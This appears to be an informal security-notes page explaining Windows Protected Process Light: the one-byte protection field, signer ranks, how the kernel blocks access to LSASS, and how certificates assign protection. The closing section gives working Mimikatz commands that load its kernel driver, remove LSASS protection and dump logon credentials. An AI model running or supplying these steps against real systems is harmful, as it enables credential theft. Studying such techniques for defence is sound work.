---
icon: shield-user
---

# PPL (Protected Process Light)

### okay so first why does PPL even exist?

so like before PPL was a thing, windows had a pretty simple rule:

> if you're an admin with `SeDebugPrivilege` you can open ANY process, read its memory, write to it, basically do whatever you want

and that was fine until credentials started living inside LSASS memory. now every piece of malware that gets admin just calls `OpenProcess(LSASS)` and dumps everything. fr it was that easy.

Microsoft needed a way to say **"even if you're admin, you CANNOT touch this process"** and that's exactly what PPL is.

***

### what even is PPL tho

okay so every process in windows is represented in the kernel as something called `EPROCESS` think of it like the kernel's **ID card** for every running process. it holds literally everything about that process.

inside that ID card there's one field called `PS_PROTECTION` and its literally just **one byte**. but that one byte controls everything.

```
typedef struct _PS_PROTECTION {
    union {
        UCHAR Level;          // the full byte
        struct {
            UCHAR Type   : 3; // bits 0-2: what KIND of protection?
            UCHAR Signer : 4; // bits 4-7: WHO signed this binary?
        };
    };
} PS_PROTECTION;
```

#### breaking down that one byte fr

so LSASS = `0x41` = `0100 0001` in binary. the lower 3 bits give you `001` which is Type 1 = PPL. the upper 4 bits give you `0100` which is Signer 4 = Lsa. that's it, two values packed into one byte.

***

### the rank system this is where it gets actually interesting

so PPL has this whole **rank/hierarchy system** based on who signed the binary. higher rank = more powerful = can access lower ranks. lower rank trying to access higher rank? nah bestie, not happening.

the ranks go from 0 to 7. rank 7 is WinSystem (the system process itself), rank 6 is WinTcb (wininit.exe, smss.exe, csrss.exe), rank 5 is Windows components, rank 4 is Lsa which is where LSASS sits, rank 3 is Antimalware which is where Defender sits, and rank 0 is you, a normal unprotected process with nothing.

and the full hierarchy looks like this:

at the top you have PP WinSystem `0x72` and PP WinTcb `0x62`, then dropping down to PPL you have WinTcb `0x61`, then Lsa `0x41` which is LSASS, then Antimalware `0x31` which is Defender, and at the very bottom you have unprotected processes at `0x00` which is where you are.

also quick note there's PP (Protected Process) and PPL (Protected Process **Light**). PP is the older stronger version, PPL is the newer lighter but more flexible one. a PPL can **never** open a PP regardless of rank. PP always wins. always.

***

### so HOW does it actually protect LSASS

when you call `OpenProcess(LSASS)` the kernel reads your `EPROCESS.Protection` which is `0x00`, then reads LSASS's which is `0x41`. it sees you're unprotected, so it caps what rights you're allowed to get. you only get `PROCESS_QUERY_LIMITED_INFORMATION`, `PROCESS_SET_LIMITED_INFORMATION`, `PROCESS_TERMINATE` and `PROCESS_SUSPEND_RESUME`. you asked for `VM_READ` which isn't in that list, so you get `ACCESS DENIED`, error `0x5`.

and the wildest part? it doesn't even CHECK your privileges. doesn't matter if you're SYSTEM. doesn't matter if you have every privilege in existence. the PPL check happens **before** any of that. your rank is `0x00`, game over immediately.

this is why mimikatz fails with that `0x00000005` error even when you're running as admin with SeDebugPrivilege **the kernel literally doesn't care about your privileges, only your protection byte.**

***

### how does a process even GET its protection level

okay this is the part most people skip and fr it's the most important part.

the kernel doesn't just hand out protection levels to anyone. the binary has to **earn** it through its digital certificate. specifically through something called **EKU (Enhanced Key Usage) OIDs** embedded in the Authenticode certificate.

when Windows launches a process it reads the binary's Authenticode certificate, walks the certificate chain to make sure it reaches Microsoft's root CA, checks the EKU OIDs inside the certificate, maps those OIDs to `PS_PROTECTION` values, and stamps that value into `EPROCESS.Protection`.

#### why you can't fake it

even if your binary has a self-signed cert with the right OID, the kernel walks the whole certificate chain. if that chain doesn't reach Microsoft's root CA, your OID gets completely ignored and your process gets `Protection = 0x00`. Microsoft controls the root CA, you can't get around that from userland, period.

***

### bypassing PPL with Mimikatz the mimidrv.sys way

okay so now the fun part. since PPL is enforced by the kernel, the only real way to beat it is to **get into the kernel yourself** and patch that one byte directly.

that's exactly what `mimidrv.sys` does. it's Mimikatz's own kernel driver, written specifically to find LSASS's EPROCESS in kernel memory and flip that Protection byte to `0x00`.

#### the flow

```
mimikatz # !+
```

_this loads mimidrv.sys as a kernel driver service_

```
mimikatz # !processprotect /process:lsass.exe /remove
```

_driver finds EPROCESS of LSASS in kernel memory_ _patches Protection byte: 0x41 → 0x00_ _LSASS now looks completely unprotected to the kernel_

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

_now OpenProcess works fine, credentials dump successfully_

before mimidrv runs, LSASS has `Protection = 0x41` so any `OpenProcess(VM_READ)` call gets denied. after mimidrv patches it to `0x00`, the kernel sees LSASS as completely unprotected and the same call goes through fine.

when you're done you can restore it:

```
mimikatz # !processprotect /process:lsass.exe
mimikatz # !-
```
